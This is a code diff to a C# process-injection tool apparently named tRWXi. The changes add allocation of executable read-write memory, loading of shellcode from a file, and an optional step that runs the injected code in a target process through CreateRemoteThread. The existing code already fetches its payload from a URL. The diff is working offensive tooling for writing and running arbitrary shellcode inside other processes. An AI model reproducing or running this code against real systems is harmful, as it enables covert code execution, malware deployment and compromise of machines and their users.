@@ -50,6 +50,9 @@ namespace tRWXi
             public uint Type;
         }
 
+        [DllImport("kernel32")]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
         [DllImport("kernel32.dll")]
         static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, int dwLength);
 
@@ -67,6 +70,9 @@ namespace tRWXi
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
 
         private const Int32 TH32CS_SNAPPROCESS = 0x02;
         private const Int32 PAGE_EXECUTE_READ_WRITE = 0x40;
@@ -120,6 +126,12 @@ namespace tRWXi
                         lpAddress = IntPtr.Zero;
                     }
                 }
+                else if (parameters.ContainsKey("allocate"))
+                {
+                    IntPtr addr = VirtualAlloc(IntPtr.Zero, Convert.ToUInt32(parameters["size"], 16), 0x3000, 0x40);
+                    Console.WriteLine("[+] PID: {0}, ADDR: 0x{1}", System.Diagnostics.Process.GetCurrentProcess().Id, addr.ToString());
+                    while (true) { }
+                }
                 else if (parameters.ContainsKey("inject") || parameters.ContainsKey("trigger") || parameters.ContainsKey("read"))
                 {
                     if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
@@ -148,6 +160,10 @@ namespace tRWXi
                             {
                                 data = Utils.Shellcoder.fetch(parameters["url"]);
                             }
+                            else if (parameters.ContainsKey("file"))
+                            {
+                                data = Utils.Shellcoder.convert(System.IO.File.ReadAllText(parameters["file"]));
+                            }
                             else
                             {
                                 data = new byte[] { };
@@ -158,14 +174,16 @@ namespace tRWXi
                         }
                         else {}
 
-                        Console.WriteLine("[!] Starting execution...");
-                        IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
-
-                        if ((int)res != 0)
+                        if (parameters.ContainsKey("execute"))
                         {
-                            Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                            Console.WriteLine("[!] Starting execution...");
+                            IntPtr res = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+                            if ((int)res != 0)
+                            {
+                                Console.WriteLine(String.Format("[+] Successfully executed code. Thread handle [{0}] has been created", res.ToInt64()));
+                            }
+                            Environment.Exit(0);
                         }
-                        Environment.Exit(0);
                     }
                     else
                     {
